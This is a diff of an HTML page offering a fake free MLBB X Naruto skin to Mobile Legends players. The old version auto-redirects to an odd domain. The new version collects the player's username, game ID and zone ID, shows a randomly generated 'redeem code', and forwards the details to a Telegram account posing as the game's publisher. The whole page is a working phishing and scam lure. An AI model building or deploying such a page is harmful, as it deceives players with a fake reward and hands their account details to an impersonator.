@@ -1,71 +1,149 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Claim MLBB X Naruto Skin</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            background-color: #0f0f0f;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            color: white;
-        }
-        .container {
-            background-color: #222;
-            border-radius: 10px;
-            padding: 20px;
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
-            text-align: center;
-            width: 300px;
-            border: 2px solid #00FF00;
-        }
-        h1 {
-            color: #00FF00;
-            text-shadow: 0 0 10px #00FF00, 0 0 20px #00FF00;
-        }
-        p {
-            color: #ffffff;
-            font-size: 16px;
-            margin-bottom: 20px;
-        }
-        .btn {
-            background-color: #00FF00;
-            color: white;
-            padding: 10px 20px;
-            font-size: 16px;
-            border: none;
-            border-radius: 5px;
-            cursor: pointer;
-            text-decoration: none;
-            display: inline-block;
-            margin-top: 15px;
-            box-shadow: 0 0 5px #00FF00, 0 0 20px #00FF00;
-            transition: all 0.3s ease;
-        }
-        .btn:hover {
-            background-color: #00CC00;
-            box-shadow: 0 0 10px #00FF00, 0 0 30px #00FF00;
-        }
-    </style>
-    <script type="text/javascript">
-        // Redirect automatically to the Mobile Legends page after 3 seconds
-        setTimeout(function() {
-            window.location.href = "https://yslkj.czlwws.web.id";
-        }, 3000);
-    </script>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>MLBB Naruto Skin Redeem</title>
+  <style>
+    body {
+      font-family: 'Segoe UI', sans-serif;
+      background: linear-gradient(135deg, #000000, #0f0f0f);
+      color: #00ffe0;
+      margin: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+
+    .container {
+      background: #111;
+      border: 2px solid #00ffe0;
+      padding: 30px;
+      border-radius: 16px;
+      width: 360px;
+      box-shadow: 0 0 25px #00ffe0;
+      text-align: center;
+    }
+
+    h2, h3 {
+      color: #00ffe0;
+      margin-bottom: 20px;
+    }
+
+    input, select, button {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      font-size: 16px;
+      border-radius: 6px;
+      border: none;
+    }
+
+    input, select {
+      background: #1a1a1a;
+      color: #00ffe0;
+      border: 1px solid #00ffe0;
+    }
+
+    button {
+      background: linear-gradient(135deg, #00ffe0, #00bfff);
+      color: #000;
+      font-weight: bold;
+      cursor: pointer;
+      transition: transform 0.2s ease;
+    }
+
+    button:hover {
+      transform: scale(1.05);
+    }
+
+    .hidden {
+      display: none;
+    }
+
+    #resultBox {
+      background: #1b1b1b;
+      padding: 20px;
+      border: 1px solid #00ffe0;
+      border-radius: 10px;
+      margin-top: 10px;
+      color: #00ffe0;
+    }
+
+    strong {
+      color: #ffffff;
+    }
+  </style>
 </head>
 <body>
 
-<div class="container">
-    <h1>MLBB X Naruto</h1>
-    <p>You will be redirected to claim your exclusive MLBB X Naruto skin.</p>
-    <p>If not redirected automatically, <a href="https://yslkj.czlwws.web.id" class="btn">Click here</a></p>
-</div>
+  <div class="container">
+    <div id="formPage">
+      <h2>MLBB Naruto Skin Redeem</h2>
+      <form id="redeemForm">
+        <input type="text" id="username" placeholder="Enter your MLBB Username" required />
+        <input type="text" id="mlbbId" placeholder="Enter your MLBB ID" required />
+        <input type="text" id="zoneId" placeholder="Enter your Zone ID" required />
+        <select id="skinSelect" required>
+          <option value="" disabled selected>Select Your Skin</option>
+          <option>Lukas - Naruto Uzumaki</option>
+          <option>Kalea - Sakura</option>
+          <option>Hayabusa - Kakashi</option>
+          <option>Suyou - Sasuke</option>
+          <option>Ling - Neobeast</option>
+        </select>
+        <button type="submit">Get Redeem Code</button>
+      </form>
+    </div>
+
+    <div id="resultPage" class="hidden">
+      <div id="resultBox">
+        <h3>Congratulations!</h3>
+        <p>Username: <strong id="displayUsername"></strong></p>
+        <p>Selected Skin: <strong id="skinName"></strong></p>
+        <p>Your Redeem Code: <strong id="codeResult"></strong></p>
+        <p>You'll be redirected to Telegram now...</p>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    const form = document.getElementById("redeemForm");
+    const formPage = document.getElementById("formPage");
+    const resultPage = document.getElementById("resultPage");
+
+    form.addEventListener("submit", function (e) {
+      e.preventDefault();
+
+      const username = document.getElementById("username").value.trim();
+      const mlbbId = document.getElementById("mlbbId").value.trim();
+      const zoneId = document.getElementById("zoneId").value.trim();
+      const skin = document.getElementById("skinSelect").value;
+
+      if (!username || !mlbbId || !zoneId || !skin) {
+        alert("Please complete all fields.");
+        return;
+      }
+
+      const redeemCode = "MLBB-" + Math.random().toString(36).substr(2, 6).toUpperCase();
+
+      document.getElementById("displayUsername").textContent = `: ${username} ID : ${mlbbId} ID SERVER : ${zoneId} `;
+      document.getElementById("skinName").textContent = skin;
+      document.getElementById("codeResult").textContent = redeemCode;
+
+      formPage.classList.add("hidden");
+      resultPage.classList.remove("hidden");
+      
+      const message = encodeURIComponent(
+        `MLBB Redeem Request:\nUsername: ${username}\nID: ${mlbbId}\nZone: ${zoneId}\nSkin: ${skin}\nCode: ${redeemCode}\nHello admin, I just redeemed MLBB skin`
+      );
+
+      setTimeout(() => {
+        window.location.href = `tg://resolve?domain=Moonton027&text=${message}`;
+      }, 3000);
+    });
+  </script>
 
 </body>
-</html>
+                                 </html>
